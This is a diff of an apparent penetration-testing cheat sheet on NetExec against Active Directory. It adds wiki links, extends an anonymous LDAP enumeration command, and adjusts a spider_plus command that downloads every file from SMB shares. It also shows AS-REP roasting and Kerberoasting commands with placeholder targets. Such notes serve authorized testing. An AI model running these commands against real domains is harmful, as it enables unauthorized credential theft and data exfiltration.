@@ -304,12 +304,14 @@ netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --share <SHARE> --put-file '<FULL
 
 ## LDAP
 
+- https://www.netexec.wiki/ldap-protocol/
+
 **NOTE: requires use of the FQDN of the DOMAIN CONTROLLER only -- NOT IP address nor any other machine... add the FQDN to `/etc/hosts`**
 
 ### Anonymous LDAP Search
 
 ```bash
-nxc ldap <DC_FQDN> -u '' -p '' --users
+nxc ldap <DC_FQDN> -u '' -p '' --users --groups --computers --pass-pol --get-sid
 ```
 
 ### Admin Count Enumeration
@@ -361,9 +363,11 @@ nxc ldap <DC_FQDN> -u <GMSA_READER_USER> -p '<PASS>' --gmsa
 
 ### ASREPROAST
 
+- https://www.netexec.wiki/ldap-protocol/asreproast
+
 When `DONT_REQ_PREAUTH` is disabled, the pre-auth (password) is not required for the DC to send a TGT for a vulnerable account.
 
-{{< embed-section page="Docs/5 - Exploitation/online-credentials-attacks" header="best-wordlists" >}}
+See [best user wordlists for good defaults to try first.]({{% ref "Docs/5 - Exploitation/online-credentials-attacks" %}}#best-wordlists)
 
 ```bash
 # WITHOUT creds -- REQUIRES user list
@@ -375,6 +379,8 @@ nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' --asreproast nxc_asreproast_credent
 ```
 
 ### KERBEROAST
+
+- https://www.netexec.wiki/ldap-protocol/kerberoasting
 
 Requests TGS tickets for accounts with SPNs set. The TGS is encrypted with the service account's password hash -- crackable offline.
 
@@ -572,10 +578,10 @@ netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --regex .
 
 #### `spider_plus`
 
-Download all files from all shares except the excluded defaults; max file size 10MB
+Download all files from all shares except the excluded defaults; max file size `1 MB`
 
 ```bash
-nxc smb <TARGET> -u <USER> -p <PASS> -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=$HOME/nxc_spider MAX_FILE_SIZE=$((1024 * 1024 * 10)) EXCLUDE_FILTER='admin$,c$,ipc$,print$,NETLOGON,SYSVOL'
+nxc smb <TARGET> -u <USER> -p <PASS> -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=$HOME/nxc_spider MAX_FILE_SIZE=$((1024 * 1024 * 1)) EXCLUDE_FILTER='admin$,c$,ipc$,print$,NETLOGON,SYSVOL'
 ```
 
 #### `gpp_password`
